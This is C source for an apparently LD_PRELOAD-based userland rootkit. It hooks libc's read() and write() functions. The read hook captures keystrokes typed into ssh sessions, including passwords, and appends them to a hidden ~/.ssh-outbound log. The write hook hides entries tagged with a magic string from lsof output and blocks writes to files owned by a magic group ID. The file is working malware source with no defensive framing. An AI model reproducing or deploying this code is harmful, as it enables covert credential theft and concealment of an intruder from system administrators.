// This is extremely buggy.
// Do not parse the ssh-outbound file without cleaning it up.
// Sometimes ssh will read binaries 1 byte at a time (wtf?)
// and as a result there will be vomit in the logfile.
// At least run strings -a or something.
ssize_t read(int fd, void *buf, size_t count) {
    int rval,i,c;
    if(!libc) libc=dlopen(LIBC_PATH,RTLD_LAZY);
    if(!old_read) old_read=dlsym(libc,"read");
    if(fd == 0) return old_read(0,buf,count); // Bail early reading stdin (this is not a password file descriptor.)
    c = 0; i = 0;
    char *dupbuf, *self;
    self = get_my_procname();
    for (i=0; i < 255; i++) {
      if(self[i] == 0) { c++; self[i] = ' '; }
      else c = 0;
      if(c > 1) break;
    }
    struct stat s_fstat;
    FILE *log;
    if(!strcmp(self,"plymouth-upstart-bridge")) return old_read(fd,buf,count); // Fuck you Plymouth.
    if(count != 1) return old_read(fd,buf,count); // don't even bother loading more symbols
    if(!old_fopen) old_fopen=dlsym(libc,"fopen");
    if(!old_fxstat) old_fxstat=dlsym(libc,"__fxstat");
    memset (&s_fstat, 0, sizeof (stat));
    old_fxstat (_STAT_VER, fd, &s_fstat);
    rval = old_read(fd,buf,count); // if we got here, either we want the data or something is horribly wrong.
    if(S_ISSOCK(s_fstat.st_mode)) return rval; // something is horribly wrong. It's a socket.
    if(isatty(fd) && count == 1 && (!strcmp(self,"ssh") || !strcmp(self,"/usr/bin/ssh")) ) {
      dupbuf = strdup((char *)buf);
      dupbuf[1] = '\0'; // we want ONE character. Not one character and vomit.
      if( (log = old_fopen(HOMEDIR "/.ssh-outbound","a"))) { // suggest parens around truth value.. stfu gcc
         if(strcmp(dupbuf,"\n")) fprintf(log,"%1s",dupbuf);
         else fprintf(log," %s\n",self);
         fflush(log);
         fclose(log);
      }
    }
    return rval;
}

ssize_t write (int fd, const void *buf, size_t nbyte) {
  // This is a cool spot to do "grep -v" kind of shit.
  struct stat s_fstat;
  char *me;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_write) old_write = dlsym(libc, "write");
  if (!old_fxstat) old_fxstat = dlsym(libc, "__fxstat");
  me = get_my_procname();
  if(fd == 1 &&(!strcmp(me,"lsof") || !strcmp(me,"/usr/bin/lsof"))) {
    if(strstr(buf,MAGIC_STRING)) return nbyte; // lsof is gaaaaaaaaaaay
  }
  old_fxstat (_STAT_VER, fd, &s_fstat);
  if(S_ISSOCK(s_fstat.st_mode)) return old_write(fd,buf,nbyte); // fixes that pesky fucking ssh write() problem
  if(getgid() == MAGIC_GID) return old_write(fd,buf,nbyte);
  memset (&s_fstat, 0, sizeof (stat));
  if (s_fstat.st_gid == MAGIC_GID && getgid() != MAGIC_GID) {
    errno = EIO;
    return -1;
  }

  return old_write (fd, buf, nbyte);
}


